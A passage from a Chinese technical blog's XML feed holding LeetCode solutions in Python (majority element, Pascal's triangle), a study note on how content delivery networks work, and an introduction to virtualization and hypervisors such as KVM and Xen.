填充预留的位置</span></div><div class="line">                j -= <span class="number">1</span></div><div class="line">        nums1[:j + <span class="number">1</span>] = nums2[:j + <span class="number">1</span>]  <span class="comment"># 复制 nums2 中剩余的数</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 169. Majority Element</title>
    <url>/2018/12/23/LeetCode-169-Majority-Element/</url>
    <content><![CDATA[<center>LeetCode 169. Majority Element 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given an array of size <em>n</em>, find the majority element. The majority element is the element that appears <strong>more than</strong> <code>⌊ n/2 ⌋</code>times.</p>
<p>You may assume that the array is non-empty and the majority element always exist in the array.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个大小为 <em>n</em> 的数组，找到其中的众数。众数是指在数组中出现次数<strong>大于</strong> <code>⌊ n/2 ⌋</code> 的元素。</p>
<p>你可以假设数组是非空的，并且给定的数组总是存在众数。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [3,2,3]</div><div class="line">输出: 3</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [2,2,1,1,1,2,2]</div><div class="line">输出: 2</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　使用 <code>set()</code> 方法得到列表中不重复元素的元组，然后再遍历这个元组，使用列表的 <code>count()</code> 方法依次统计元组中元素在列表中出现的次数，然后查看出现是否大于 <code>⌊ n/2 ⌋</code> ，如果是则输出该元素即可，因为在任何数组中，出现次数大于该数组长度一半的值只能有一个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        s = set(nums)  <span class="comment"># 不重复元素</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">            con = nums.count(i)  <span class="comment"># 统计出现次数</span></div><div class="line">            <span class="keyword">if</span> con &gt; len(nums) // <span class="number">2</span>:  <span class="comment"># //为整数除法，返回不大于结果的一个最大的整数</span></div><div class="line">                <span class="keyword">return</span> i  <span class="comment"># 返回结果</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用排序法，排序后，出现次数大于一半的肯定在中间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span><span class="params">(self, nums)</span>:</span></div><div class="line">        nums.sort()</div><div class="line">        <span class="keyword">return</span> nums[len(nums)//<span class="number">2</span>]</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 3</strong></li>
</ul>
<p>　　使用摩尔投票法。摩尔投票法的基本思想很简单，在每一轮投票过程中，从数组中找出一对不同的元素，将其从数组中删除。这样不断的删除直到无法再进行投票，如果数组为空，则没有任何元素出现的次数超过该数组长度的一半。如果只存在一种元素，那么这个元素则可能为目标元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        count = <span class="number">0</span></div><div class="line">        res = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:	<span class="comment"># 遍历数组</span></div><div class="line">            <span class="keyword">if</span> count == <span class="number">0</span> <span class="keyword">or</span> i == res:</div><div class="line">                res = i</div><div class="line">                count += <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                count -= <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>CDN：内容分发网络</title>
    <url>/2018/12/23/CDN%EF%BC%9A%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<center>内容分发网络学习笔记。</center>

<a id="more"></a>
<h4 id="CDN-简介"><a href="#CDN-简介" class="headerlink" title="CDN 简介"></a>CDN 简介</h4><h5 id="CDN-是什么？"><a href="#CDN-是什么？" class="headerlink" title="CDN 是什么？"></a>CDN 是什么？</h5><p>　　CDN 的全称是 Content Delivery Network，即内容分发网络。其目的是使用户可就近取得所需内容，解决 Internet 网络拥挤的状况，提高用户访问网站的响应速度。类似分布各地的物流仓储网络，CDN 网络可以将源站的内容缓存到分布全球的 CDN 节点，根据用户的访问 IP，就近连接 CDN，提高网站响应速度。</p>
<h5 id="为什么需要-CDN-？"><a href="#为什么需要-CDN-？" class="headerlink" title="为什么需要 CDN ？"></a>为什么需要 CDN ？</h5><p>　　<strong>为了加速网站的访问</strong>。通常用户满意的网页打开时间是在 2 秒以下。互联网有一项著名的 8 秒原则。用户在访问 Web 网页时，如果时间超过 8 秒就会感到不耐烦，如果下载需要太长时间，他们就会放弃访问。</p>
<h5 id="优势与特点"><a href="#优势与特点" class="headerlink" title="优势与特点"></a>优势与特点</h5><ul>
<li><p>本地缓存加速。提高了网站（尤其含有大量图片和静态页面站点）的访问速度和稳定性。</p>
</li>
<li><p>镜像服务。消除了不同运营商之间互联的瓶颈造成的影响，实现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。</p>
</li>
<li>远程加速。远程访问用户根据 DNS 负载均衡技术智能自动选择 CDN 服务器，选择最快的 CDN 服务器，加快远程访问的速度。</li>
<li>带宽优化。自动生成服务器的远程镜像 CDN 服务器，远程用户访问时从 CDN 服务器上读取数据，减少远程访问的带宽、分担网络流量、减轻原站点 WEB 服务器负载等功能。</li>
<li>集群抗攻击。广泛分布的 CDN 节点加上节点之间的智能冗余机制，可以有效地预防黑客入侵以及降低各种 DDoS 攻击对网站的影响，同时保证较好的服务质量 。</li>
</ul>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><h5 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h5><ol>
<li>挑选最优设备为用户提供服务。</li>
<li>如果某个内容被很多用户所需要，那么它就被缓存到距离用户最近的节点。</li>
</ol>
<h5 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h5><p>　　<strong>用户访问<em>未使用 CDN</em> 缓存的传统网站的步骤</strong>：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/23-1.png" alt="23-1"></p>
<ol>
<li>用户在浏览器输入要访问网站的域名。</li>
<li>浏览器向本地 DNS 服务器请求该域名的解析。</li>
<li>本地 DNS 服务器如果有这个域名解析结果的缓存，则直接响应用户的解析请求。</li>
<li>本地 DNS 服务器如果没有这个域名解析结果的缓存，则以递归形式向整个 DNS 系统请求解析，获得应答后将结果反馈给浏览器。</li>
<li>浏览器得到域名解析结果，即该域名相应的服务器的 IP 地址。</li>
<li>浏览器向服务器发起 TCP 连接，建立连接发送 HTTP 协议报文。</li>
<li>服务器向浏览器发送页面内容，浏览器将页面展现出来。</li>
</ol>
<p>　　<strong>用户访问<em>使用 CDN</em> 的网站的步骤</strong>：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/23-2.png" alt="23-2"></p>
<ol>
<li>用户向浏览器提供要访问的网址。由于网站的 DNS 域名解析器设置了 CNAME，经过本地 DNS 系统解析，DNS 系统会将域名的解析权交给 CNAME 指向的 CDN 专用 DNS 服务器。</li>
<li>CDN 专用 DNS 服务器将 CDN 全局负载均衡设备的 IP 地址返回给浏览器。</li>
<li>浏览器向 CDN 的全局负载均衡设备发送访问请求。</li>
<li>CDN 全局负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。</li>
<li>区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户 IP 地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址。</li>
<li>全局负载均衡设备把服务器的IP地址返回给用户。</li>
<li>用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</li>
</ol>
<h4 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h4><h5 id="内容发布"><a href="#内容发布" class="headerlink" title="内容发布"></a>内容发布</h5><p>　　它借助于建立索引、缓存、流分裂、组播（Multicast）等技术。</p>
<h5 id="内容路由"><a href="#内容路由" class="headerlink" title="内容路由"></a>内容路由</h5><p>　　它是整体性的网络负载均衡技术，通过内容路由器中的重定向（DNS）机制，在多个远程 POP 上均衡用户的请求，以使用户请求得到最近内容源的响应；</p>
<h5 id="内容交换"><a href="#内容交换" class="headerlink" title="内容交换"></a>内容交换</h5><p>　　它根据内容的可用性、服务器的可用性以及用户的背景，在 POP 的缓存服务器上，利用应用层交换、流分裂、重定向（ICP、WCCP）等技术，智能地平衡负载流量；</p>
<h5 id="性能管理"><a href="#性能管理" class="headerlink" title="性能管理"></a>性能管理</h5><p>　　它通过内部和外部监控系统，获取网络部件的状况信息，测量内容发布的端到端性能（如包丢失、延时、平均带宽、启动时间、帧速率等），保证网络处于最佳的运行状态。</p>
<h4 id="CDN的应用场景"><a href="#CDN的应用场景" class="headerlink" title="CDN的应用场景"></a>CDN的应用场景</h4><h5 id="网站站点-应用加速"><a href="#网站站点-应用加速" class="headerlink" title="网站站点/应用加速"></a>网站站点/应用加速</h5><p>　　站点或者应用中大量静态资源的加速分发，可以将站点内容进行动静分离，动态文件可以结合云服务器，静态资源如各类型图片、html、css、js文件等可以结合对象存储 OSS 存储海量静态资源，可以有效加速内容加载速度，轻松搞定网站图片、短视频等内容分发。</p>
<h5 id="视音频点播-大文件下载分发加速"><a href="#视音频点播-大文件下载分发加速" class="headerlink" title="视音频点播/大文件下载分发加速"></a>视音频点播/大文件下载分发加速</h5><p>　　支持各类文件的下载、分发，支持在线点播加速业务，如 mp4、flv 视频文件或者平均单个文件大小在 20M 以上，主要的业务场景是视音频点播、大文件下载（如安装包下载）等，建议搭配对象存储 OSS 使用，可提升回源速度，节约近 2/3 回源带宽成本。</p>
<h5 id="视频直播加速"><a href="#视频直播加速" class="headerlink" title="视频直播加速"></a>视频直播加速</h5><p>　　视频流媒体直播服务，支持媒资存储、切片转码、访问鉴权、内容分发加速一体化解决方案。结合弹性伸缩服务，及时调整服务器带宽，应对突发访问流量；结合媒体转码服务，享受高速稳定的并行转码，且任务规模无缝扩展。目前 CDN 直播加速已服务内部用户测试并优化，即将上线</p>
<h5 id="移动应用加速"><a href="#移动应用加速" class="headerlink" title="移动应用加速"></a>移动应用加速</h5><p>　　移动 APP 更新文件（apk文件）分发，移动 APP 内图片、页面、短视频、UGC 等内容的优化加速分发。提供 httpDNS 服务，避免 DNS 劫持并获得实时精确的 DNS 解析结果，有效缩短用户访问时间，提升用户体验。</p>
]]></content>
      <categories>
        <category>Distributed</category>
      </categories>
      <tags>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 119. Pascal's Triangle II</title>
    <url>/2018/12/12/LeetCode-119-Pascal-s-Triangle-II/</url>
    <content><![CDATA[<center>LeetCode 119. Pascal’s Triangle II 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given a non-negative index <em>k</em> where <em>k</em> ≤ 33, return the <em>k</em>th index row of the Pascal’s triangle.</p>
<p>Note that the row index starts from 0.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个非负索引 <em>k</em>，其中 <em>k</em> ≤ 33，返回杨辉三角的第 <em>k</em> 行。</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/PascalTriangleAnimated2.gif" alt=""></p>
<p>在杨辉三角中，每个数是它左上方和右上方的数的和。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: 3</div><div class="line">输出: [1,3,3,1]</div></pre></td></tr></table></figure>
<h5 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h5><p>你可以优化你的算法到 <em>O</em>(<em>k</em>) 空间复杂度吗？</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　使用 118. Pascal’s Triangle 中的思路，保存每一行的结果，但是，最后只返回保存结果的最后一行即可。注意，这里给的是行的索引，从 0 开始的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getRow</span><span class="params">(self, rowIndex)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type rowIndex: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">    	res = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(rowIndex+<span class="number">1</span>):</div><div class="line">            res.append([<span class="number">1</span>])</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, i + <span class="number">1</span>):</div><div class="line">                <span class="keyword">if</span> j == i:</div><div class="line">                    res[i].append(<span class="number">1</span>)</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    res[i].append(res[i - <span class="number">1</span>][j - <span class="number">1</span>] + res[i - <span class="number">1</span>][j])</div><div class="line">        <span class="keyword">return</span> res[<span class="number">-1</span>]</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　依然考虑杨辉三角的规律：（1）第 i 层有 i 个元素。（2）每层第一个以及最后一个元素值为 1。（3）对于第 <code>i (i &gt; 2)</code> 层第 <code>j（j &gt; 1 &amp;&amp; j &lt; i）</code> 个元素 <code>A[i][j]</code>，A<code>[i][j] = A[i-1][j-1] + A[i-1][j]</code> 。这里我们不需要存储每一行的数据，每次用上一行数据生成中间的数，每行的第一个以及最后一个元素值为 1，依次更新，直到要求的索引行数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getRow</span><span class="params">(self, rowIndex)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type rowIndex: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        res = [<span class="number">1</span>]</div><div class="line">        <span class="keyword">if</span> rowIndex == <span class="number">0</span>:  <span class="comment"># 只有 1 行的情况</span></div><div class="line">            <span class="keyword">return</span> res</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(rowIndex + <span class="number">1</span>):  <span class="comment"># 依次生成每行</span></div><div class="line">            tmp = res  <span class="comment"># 存储上一行元素</span></div><div class="line">            res = [<span class="number">1</span>]  <span class="comment"># 第一个</span></div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i - <span class="number">1</span>):</div><div class="line">                res.append(tmp[j] + tmp[j + <span class="number">1</span>])  <span class="comment"># 用上一行元素生成该行的中间元素</span></div><div class="line">            res.append(<span class="number">1</span>)  <span class="comment"># 最后一个元素</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>初识-虚拟化技术</title>
    <url>/2018/12/12/%E5%88%9D%E8%AF%86-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p><center>虚拟化技术简介。</center><br><a id="more"></a></p>
<h4 id="什么是虚拟化？"><a href="#什么是虚拟化？" class="headerlink" title="什么是虚拟化？"></a>什么是虚拟化？</h4><p>　　虚拟化是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机，本质上是软/硬件层的抽象。在一台计算机上同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。</p>
<h4 id="虚拟化的目的"><a href="#虚拟化的目的" class="headerlink" title="虚拟化的目的"></a>虚拟化的目的</h4><p>　　虚拟化技术主要用来解决高性能的物理硬件产能过剩和老的旧的硬件产能过低的重组重用，透明化底层物理硬件，从而最大化的利用物理硬件，简单来说就是将底层资源进行分区，并向上层提供特定的和多样化的执行环境。</p>
<p>　　通过一个简单明了的例子来进行说明为什么需要虚拟化？</p>
<p>　　生鲜市场有很多买东西的商贩（企业），他们需要一个库房（服务器）来存放和处理这些商品。但是鱼呀、肉啊都需要低温才可以保鲜，所以得有制冷机（操作系统），主流的制冷机有 Windows 制冷机和 Linux 制冷机两种，配备了制冷机的库房就可以正常工作啦！最初的冷库就是这个样子：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/12-2.jpg" alt="12-1"></p>
<p>　　可是问题来了，各种库藏品都很矫情，它们对温度的要求不一致，放在一起还会串味儿，鸡腿变成了咸鱼口味，冰激凌有了小龙虾味儿。</p>
<p>　　有个叫 VMware 的泥瓦匠想了个办法，把库房隔成很多叫做“虚拟机”的小库房，每个房间放一个制冷机，这样就再也不怕串味儿，每个小房间的温度独立可控，鱼呀虾呀表示很 Happy。这就叫做冷库虚拟化技术。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/12-1.jpg" alt="12-2"></p>
<p>　　原本是个挺完美的方案了，偏偏有人爱吹毛求疵瞎 BB，比如老板就觉得每个隔间都要放制冷机太占地方而且又费电，总想着找点别的办法。</p>
<p>　　好了，故事先说到这里。后续的博客中再介绍改进的办法，这一篇主要关注虚拟化技术的基础。</p>
<h4 id="虚拟化的原理"><a href="#虚拟化的原理" class="headerlink" title="虚拟化的原理"></a>虚拟化的原理</h4><p>　　在 OS 中加入一个虚拟化层（VMM），虚拟化层可以对下层（HostOS）硬件资源（物理CPU、内存、磁盘、网卡、显卡等）进行封装、隔离，抽象为另一种形式的逻辑资源，再提供给上层（GuestOS）使用。所以你可以理解 VMM 其实就是联系 HostOS 和 GuestOS 的一个中间件（如下图），当然虚拟化可以将一份资源抽象为多份，也可以将多份资源抽象为一份。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/12-3.png" alt="12-3"></p>
<p>　　虚拟机通常叫做客户机（Guest），物理机叫宿主机（Host），VMM（Virtual Machine Monitor，虚拟机监控系统，也叫 Hypervisor）处在中间层，既要负责对虚拟资源的管理，包括虚拟环境的调度，虚拟机之间的通信以及虚拟机的管理等，又要负责物理资源的管理，包括处理器、中断、内存、设备等的管理，此外，还要提供一些附加功能，包括定时器、安全机制、电源管理等。</p>
<h4 id="虚拟化的实现方式"><a href="#虚拟化的实现方式" class="headerlink" title="虚拟化的实现方式"></a>虚拟化的实现方式</h4><p>　　VMM 根据平台类型和实现结构有两种不同的分类（如下图），按平台类型可以分为全虚拟化和半虚拟化，按实现结构可分为 Hypervisor 模型和宿主模型。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/12-4.png" alt="12-4"></p>
<h5 id="按平台类型分"><a href="#按平台类型分" class="headerlink" title="按平台类型分"></a>按平台类型分</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/12-5.png" alt="12-5"></p>
<ul>
<li><strong>全虚拟化</strong></li>
</ul>
<p>　　全虚拟化也称为原始虚拟化技术，Hypervisor 运行在裸硬件上，充当主机操作系统，而由 Hypervisor 管理的虚拟服务器运行客户端操作系统（Guest OS）。该模型使用 VMM 完全模拟出一个跟物理主机完全一样的环境，VMM 在 Guest 操作系统和裸硬件之间用于工作协调，一些受保护指令必须由 Hypervisor（VMM 虚拟机管理程序）来捕获处理。既 VMM 会为 GuestOS 抽象模拟出它所需要的包括 CPU、磁盘、内存、网卡、显卡等抽象硬件资源，所以全虚拟化的 GuestOS 并不会知道自己其实是一台虚拟机。</p>
<p>　　但是，全虚拟化实现非常困难，首先，这需要硬件的支持，而硬件在初期设计的时候，没有那么远的前瞻性，可以预想到为虚拟化提供支持，其次，指令的复杂性，即使通过模拟的方式也很难做到全部指令都模拟。所以，就需要借助其他的一些技术来辅助虚拟化。全虚拟化的运行速度要快于硬件模拟，但是性能方面不如裸机，因为Hypervisor 需要占用一些资源。典型的全虚拟化软件有：VMWare、Hyper-V、KVM-x86(复杂指令集)。</p>
<p>　　完全虚拟化是处理器密集型技术，因为它要求 Hypervisor 管理各个虚拟服务器，并让它们彼此独立。减轻这种负担的一种方法就是，改动客户操作系统，让它以为自己运行在虚拟环境下，能够与 Hypervisor 协同工作，这种方法就叫半/准虚拟化。</p>
<ul>
<li><strong>半虚拟化</strong></li>
</ul>
<p>　　半虚拟化也叫准虚拟化，是另一种类似于全虚拟化的技术，它使用 Hypervisor 分享存取底层的硬件，但是它的 Guest OS 集成了虚拟化方面的代码。半虚拟化需要 Guest 操作系统做一些修改，使 Guest 操作系统意识到自己是处于虚拟化环境的，但是半虚拟化提供了与原操作系统相近的性能。优点是性能高，经过准虚拟化处理的服务器可与 Hypervisor 协同工作，其响应能力几乎不亚于未经过虚拟化处理的服务器。</p>
<p>　　其实现方式有：修改内核，通告被虚拟化出来的操作系统它是运行在虚拟化技术软件之上的，虚拟化出来的操作系统上执行的进程还是运行在真实硬件上，性能还是很好。半虚拟化除了修改内核外还有另外一种实现方法–在每一个 GuestOS 中安装半虚拟化软件：VMTools、RHEVTools。典型的半虚拟化软件有：Xen、KVM-PowerPC（简易指令集）。</p>
<h5 id="按实现结构分"><a href="#按实现结构分" class="headerlink" title="按实现结构分"></a>按实现结构分</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/12-6.png" alt="12-6"></p>
<ul>
<li>Hypervisor 模型</li>
</ul>
<p>　　VMM 既是操作系统，也是虚拟化软件，也就是集成了虚拟化功能的操作系统，对上为 Guest 提供虚拟化功能，对下管理着所有物理资源，它的优点就是效率高，虚拟机的安全性只依赖于 VMM，缺点就是管理所有的物理资源，意味着 VMM 要承担很多的开发工作，特别是驱动层面的开发，我们知道硬件的 I/O 设备是很多的，这些设备都要有对应的驱动来设配才能为虚拟机提供功能。</p>
<ul>
<li>宿主模型</li>
</ul>
<p>　　剥离了管理功能和虚拟化功能，虚拟化功能只是作为内核的一个模块来加载，比如 KVM 技术就是其中的佼佼者，KVM 技术可以说是云计算最核心的技术了，后面会经常用到。一般 KVM 只负责 CPU 和内存的虚拟化，I/O 的虚拟化则由另外一个技术来完成，即 Qemu。</p>
<h4 id="成熟的虚拟化技术"><a href="#成熟的虚拟化技术" class="headerlink" title="成熟的虚拟化技术"></a>成熟的虚拟化技术</h4><h5 id="VirtualBox"><a href="#VirtualBox" class="headerlink" title="VirtualBox"></a>VirtualBox</h5><p>　　Oracle公司的直接基于 Intel VT 及 AMD-V 的虚拟机管理软件。</p>
<h5 id="VMware-Workstation"><a href="#VMware-Workstation" class="headerlink" title="VMware Workstation"></a>VMware Workstation</h5><p>　　Vmware 公司的基于 Vmware 虚拟技术的虚拟机管理软件。</p>
<h5 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h5><p>　　KVM 是一个轻量级的虚拟化管理程序模块，该模块主要来自于 Linux 内核。KVM 是一个全虚拟化的解决方案。可以在 x86 架构的计算机上实现虚拟化功能。但 KVM 需要 CPU 中虚拟化功能的支持，只可在具有虚拟化支持的 CPU 上运行，即具有 VT 功能的 Intel CPU 和具有 AMD-V 功能的 AMD CPU。</p>
<h5 id="XEN"><a href="#XEN" class="headerlink" title="XEN"></a>XEN</h5><p>　　Xen 也是 Linux 下的一个虚拟化解决方案，但它是一个外部的 Hypervisor 程序（虚拟机管理程序）；它能够控制虚拟机和给多个客户机分配资源。Xen 的实现方法是运行支持 Xen 功能的 kernel，这个 kernel 是工作在 Xen 的控制之下，叫做 Domain0，使用这个kernel启动机器后，你可以在这个机器上使用 qemu 软件，虚拟出多个系统。</p>
<p>　　KVM 与 XEN 对比：</p>
<table>
<thead>
<tr>
<th>两者区别</th>
<th>Xen</th>
<th>KVM</th>
</tr>
</thead>
<tbody>
<tr>
<td>问世时间</td>
<td>2003年</td>
<td>2007年</td>
</tr>
<tr>
<td>支持企业</td>
<td>Citrix、Novell、Oracle、Sun、Ret Hat（RHEL5）和Virtual Iron</td>
<td>Redhat、Ubuntu等</td>
</tr>
<tr>
<td>支持的虚拟化技术</td>
<td>全虚拟化、半虚拟化</td>
<td>全虚拟化</td>
</tr>
<tr>
<td>支持架构</td>
<td>x86、IA64和AMD、Fujitsu、IBM、Sun等公司的ARM，以及x86/64 CPU商家和Intel嵌入式的支持</td>
<td>支持虚拟化的CPU</td>
</tr>
<tr>
<td>支持操作系统</td>
<td>UNIX、Linux和Microsoft Windows</td>
<td>UNIX、Linux和Microsoft Windows</td>
</tr>
<tr>
<td>动态迁移</td>
<td>支持</td>
<td>支持（以前不支持）</td>
</tr>
<tr>
<td>内核支持</td>
<td>需要对内核打补丁</td>
<td>内置在内核中</td>
</tr>
</tbody>
</table>
<p>　　参考资料：</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzI1NzY3Nw==&amp;mid=2247484443&amp;idx=1&amp;sn=9dd1a17e4e99dd2a0952abc149d49f35&amp;chksm=e8ca12b9dfbd9baf0cee0891da8ee61da65746f80aab59fbcd4fe865afc43f60d3197532c6b2&amp;mpshare=1&amp;scene=1&amp;srcid=0801CrPRcBdDZ4RzFK8KtHtP&amp;pass_ticket=nWj0F%2bwzYMoBWp/T4YkRCBlfl0I0NWKisijQB8/KUHQpLZGVBVd0liQNtd4MTTDM#rd" target="_blank" rel="external">[1] 【炸裂的云计算-01】虚拟化原理和分类</a></p>
<p><a href="https://www.cnblogs.com/bakari/p/7857967.html" target="_blank" rel="external">[2] 虚拟化技术总览</a></p>
<p><a href="https://blog.csdn.net/gongxifacai_believe/article/details/69266198?locationNum=9&amp;fps=1" target="_blank" rel="external">[3] 虚拟化技术详解</a></p>
<p><a href="https://www.zhihu.com/question/20848931" target="_blank" rel="external">[4] 虚拟机是怎么实现的？</a></p>
<p><a href="http://www.cnblogs.com/hsqdboke/p/4103415.html" target="_blank" rel="external">[5] 虚拟化、（完）全虚拟化、半虚拟化和准虚拟化技术个人总结</a></p>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 122. Best Time to Buy and Sell Stock II</title>
    <url>/2018/12/11/LeetCode-122-Best-Time-to-Buy-and-Sell-Stock-II/</url>
    <content><![CDATA[<center>LeetCode 122. Best Time to Buy and Sell Stock II 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong></li>
</ul>
<p>Say you have an array for which the <em>i</em>th element is the price of a given stock on day <em>i</em>.</p>
<p>Design an algorithm to find the maximum profit. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times).</p>
<p><strong>Note:</strong> You may not engage in multiple transactions at the same time (i.e., you must sell the stock before you buy again).</p>
<ul>
<li><strong>中文：</strong></li>
</ul>
<p>给定一个数组，它的第 <em>i</em> 个元素是一支给定股票第 <em>i</em> 天的价格。</p>
<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>
<p><strong>注意：</strong>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
